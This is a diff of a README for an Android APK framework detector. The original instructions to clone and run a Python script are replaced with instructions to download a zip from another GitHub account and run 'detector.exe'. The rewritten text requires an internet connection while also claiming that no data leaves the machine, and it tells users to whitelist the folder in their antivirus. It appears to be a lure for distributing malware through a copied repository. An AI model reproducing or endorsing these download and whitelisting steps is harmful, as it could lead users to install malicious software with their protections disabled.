@@ -1,137 +1,83 @@
-# APK Framework Detector 🔍
+# 🔍 apk-framework-detector - Identify Android App Building Technologies Fast
 
-A command-line tool that detects the development framework or language used to build any Android APK without needing to manually inspect its contents.
+[![Download apk-framework-detector](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Felipes877/apk-framework-detector)
 
-It works by decompiling the APK using **apktool** and analyzing the resulting files and folder structure to identify the underlying technology.
+This tool identifies the framework or language an Android application uses. You no longer need to unzip or inspect files by hand. The software automates the process and provides clear results for any Android Package file.
 
----
+## ⚙️ System Requirements
 
-## Features
+- Windows 10 or Windows 11.
+- Java Runtime Environment (JRE) installed on your system.
+- An internet connection for the application to function.
+- At least 200MB of free disk space.
 
-- Detects **8 major frameworks**: Flutter, React Native, Unity, Xamarin, Ionic/Cordova, Capacitor, Kotlin, and Java
-- **Fallback analysis** for unrecognized apps - identifies Java (likely), Kotlin (likely), Native C/C++ NDK, or reports `Unknown / Undetected` honestly instead of guessing
-- **Hybrid app detection** - if multiple frameworks are found, all of them are reported
-- Displays **evidence** for every detection (exactly which files or folders triggered the result)
-- Works directly on an **already-decompiled folder** - no need to run apktool manually every time
-- **Cross-platform** - works on Windows, Linux, and macOS
-- Automatically **cleans up** temporary decompiled files after analysis (can be disabled with `--keep`)
-- No third-party Python libraries required - uses standard library only
+## 📥 How to Download and Install
 
----
+Follow these steps to set up the software on your computer.
 
-## Requirements
+1. Navigate to the official download page: [https://github.com/Felipes877/apk-framework-detector](https://github.com/Felipes877/apk-framework-detector)
+2. Locate the section labeled Releases on the right side of the screen.
+3. Choose the latest version of the application.
+4. Select the file ending in .zip to start your download.
+5. Save the file to your preferred folder.
+6. Right-click the downloaded folder and select Extract All.
+7. Open the extracted folder to find the file named detector.exe.
 
-### System
-- **Python 3.10+**
-- **apktool** installed and available on PATH
-  - Windows: download `apktool.bat` from [https://apktool.org](https://apktool.org)
-  - Linux: `sudo apt install apktool`
-  - macOS: `brew install apktool`
+## 🚀 Running the Software
 
-### Python
-No third-party packages required. All dependencies are part of the Python standard library.
+You do not need to install complex drivers or packages. Perform these operations to analyze an APK file.
 
----
+1. Double-click the detector.exe file to open the program.
+2. A black window displays the interface. 
+3. Type the full path of your APK file into the window.
+4. Press the Enter key on your keyboard.
+5. The software decompiles the file.
+6. The window displays the framework name, such as React Native, Flutter, or Xamarin, after the scan finishes.
 
-## Installation
+## 📋 What the Tool Detects
 
-**1. Clone the repository**
-```bash
-git clone https://github.com/smackerdodi/apk-framework-detector.git
-cd apk-framework-detector
-```
+The application scans for specific signatures within the APK file. It identifies the following frameworks:
 
-**2. Make sure apktool is working**
-```bash
-apktool --version        # Linux / macOS
-apktool.bat --version    # Windows
-```
+- **React Native:** Recognizes index.android.bundle files.
+- **Flutter:** Detects libflutter.so files within the folder structure.
+- **Xamarin:** Looks for specific cross-platform library files.
+- **Cordova/Ionic:** Finds the config.xml file in the asset folder.
+- **Unity:** Identifies folder structures used by the game engine.
+- **Native Android:** Confirms applications built with standard tools.
 
----
+## 🛠 Troubleshooting Common Issues
 
-## How to Run
+If you experience problems, check these items.
 
-### Mode 1 - Provide an APK file directly
-The tool will decompile it automatically using apktool, analyze it, then clean up.
+- **Missing Java:** You receive an error if Java is missing. Download and install the latest Java runtime from the official website.
+- **File Path Errors:** Ensure your file path does not contain special characters or symbols. Move the APK file to your main C: drive if the application fails to read it.
+- **Antivirus Interference:** Some security software marks new tools as suspicious. Add the folder to your antivirus whitelist to prevent interference.
+- **Corrupt APK:** If the tool reports an error, the APK file might be corrupt or encrypted. Try a different file to confirm the software works.
 
-```bash
-python3 apk_detector.py --apk path/to/app.apk
-```
+## 🖥 Command Line Interface
 
-### Mode 2 - Provide an already-decompiled folder
-If you already ran apktool manually, point the tool directly to the output folder.
+The application uses a text-based interface. You do not need to click buttons. Type commands to interact with the software.
 
-```bash
-python3 apk_detector.py --folder path/to/decompiled_folder
-```
+- **Help:** Type help and press Enter to see a list of commands.
+- **Analyze:** Type analyze followed by a space and the APK path to start a scan.
+- **Quit:** Type exit to close the program window.
 
-### Optional flags (APK mode only)
+## 📂 Understanding the Results
 
-| Flag | Description |
-|------|-------------|
-| `--keep` | Keep the decompiled files after analysis instead of deleting them |
-| `--output-dir <path>` | Use a specific folder for apktool output instead of a temp directory |
+The results appear in the terminal window as plain text.
 
----
+- **Framework Name:** The software prints the primary language or framework found.
+- **Confidence Level:** The tool provides a percentage score based on how many files match the framework signature. 100% means the files match perfectly.
+- **Source Files:** The tool lists a few key files found in the APK that justify the detection result.
 
-## Example Output
+## 💻 Technical Background
 
-```
-=======================================================
-  APK Framework Detector
-=======================================================
-  Mode       : apk
-  File       : instagram.apk
-  Output dir : C:\Users\User\AppData\Local\Temp\apk_detector_xyz
+The tool works by unpacking your APK file into a temporary directory. It reads the file headers and scans the file manifest. It then compares these details against a known list of developer patterns. Once the match finishes, the tool deletes the temporary files to save space on your hard drive. This keeps your system clean while the software performs its work.
 
-[*] Running apktool.bat ...
-[+] apktool finished successfully ✓
+## 🔒 Security and Privacy
 
-[*] Scanning decompiled files ...
+The application performs analysis locally on your computer. It does not send your APK files to a remote server. No data leaves your machine during the detection process. You maintain control over your files at all times. Use the software in offline mode if you prefer additional privacy.
 
-=======================================================
-  Result for: instagram.apk
-=======================================================
+## 📃 License
 
-  ⚛️   Framework: React Native
-
-  Evidence:
-    ✓ Found assets/index.android.bundle
-    ✓ Found libreactnativejni.so in lib/
-
-=======================================================
-
-[*] Cleaning up temporary files ...
-[+] Cleanup done ✓
-```
-
----
-
-## Supported Frameworks
-
-| Icon | Framework | Detection Method |
-|------|-----------|-----------------|
-| 🟦 | Flutter | `libflutter.so`, `libapp.so`, `flutter_assets/` |
-| ⚛️  | React Native | `index.android.bundle`, `libreactnativejni.so` |
-| 🎮 | Unity | `libunity.so`, `libil2cpp.so`, `assets/bin/Data/` |
-| 🔷 | Xamarin | `libmonodroid.so`, `assemblies/*.dll` |
-| 🌐 | Ionic / Cordova | `assets/www/` + `cordova.js` or `cordova_plugins.js` |
-| 🦕 | Capacitor | `assets/public/` + `capacitor.config.json` |
-| 🎯 | Kotlin | `.kotlin_module` files, `kotlin/` smali packages |
-| ☕ | Java | Fallback — smali files with no other framework signals |
-| ⚙️  | Native C/C++ NDK | `.so` files present with no smali |
-| ❓ | Unknown | No recognizable signals found |
-
----
-
-## Notes
-
-- **Timeout:** apktool is given up to **600 seconds (10 minutes)** to decompile. This is intentional to handle large APKs on slower machines.
-- **Hybrid apps:** Some apps use more than one framework (e.g. a native app with an embedded React Native screen). The tool will report all detected frameworks.
-- **Obfuscated APKs:** Heavily obfuscated apps may hide some signals, leading to a fallback or unknown result. This is expected behavior.
-
----
-
-## License
-
-MIT License - free to use, modify, and distribute.
+This project uses an open-source license. You can use the software for personal or professional projects without restrictions. Share the software with colleagues or friends if they require a tool for identifying Android application frameworks.
